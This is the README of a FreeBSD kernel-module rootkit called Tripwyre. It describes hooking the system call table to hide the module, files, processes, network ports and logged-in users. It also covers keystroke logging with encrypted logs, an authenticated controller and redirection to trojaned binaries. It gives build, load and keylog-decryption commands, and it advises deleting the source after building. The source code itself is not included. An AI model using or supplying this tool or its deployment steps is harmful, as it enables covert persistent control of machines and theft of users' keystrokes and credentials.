Tripwyre LKM Rootkit for FreeBSD (Version 0.2)

ABOUT

	Tripwyre is a loadable kernel module rootkit for FreeBSD that works by
	modifying the sysent system call table. It provides a lot a features
	and it helped me learn kernel hacking on FreeBSD. This is a
	short description of the rootkit.

FEATURES
	
	* Hides itself from kldstat(1)
	* Hide traffic through ports from netstat(1)
	* Hides user's presence from w(1) and who(1)
	* Hides files and directories from ls(1), cat(1), rm(1) etc.,
	* Hides processes from ps(1) and top(1)
	* Monitors network for ICMP and UDP Connections
	* Capture keystrokes
	* Encrypts the key logs
	* Provides a controller with authentication using crypt(3)
	* Provide execve redirection for Trojaned / Monitored binaries

SETUP
	
	If you want to get started quickly, use the build script. 
	Just run:

	% ./build.sh
	and follow the instructions. You can skip the rest of this
	section.
	
	To customize and build the module, edit the options in ``options.h''
	header file and run `make'' in this directory. See the short
	description at the top of the Makefile. To remove the build run
	``make clean''.

	First run ``make compute_hash'' to compile the compute_hash
	program and redirect the output of the program to the
	controller_options.h headerfile like so:

	% ./compute_hash >> controller_options.h

	After this step proceed to building the controller.

	To build the controller, run ``make controller''. To remove
	the controller and compute_hash run ``make cclean'' or simply
	remove the binaries.

	To build the Decryption utility, run ''make decrypt''. To 
	Remove run ''make cdecrypt''. 

	Once the module and the controller are built delete the source
	file or options.h and start using the programs. For the controller
	what you type wont echo.

	To encrypt run:
        % cat hide_keylog | ./encrypt passphrase encrypted_keylog

	To Decrypt run:
	% ./decrypt passphrase encrypted_keylog | less

USE
	
	Load the KLD using:
	    sudo kldload ./module.ko

	Unload using:
	    sudo kldunload ./module.ko

	Controller Usage:
	    ./controller (type the passphrase and use the menus)

	Decrypt tool:	(after unloading the module)
	    ./decrypt /path/to/log/file
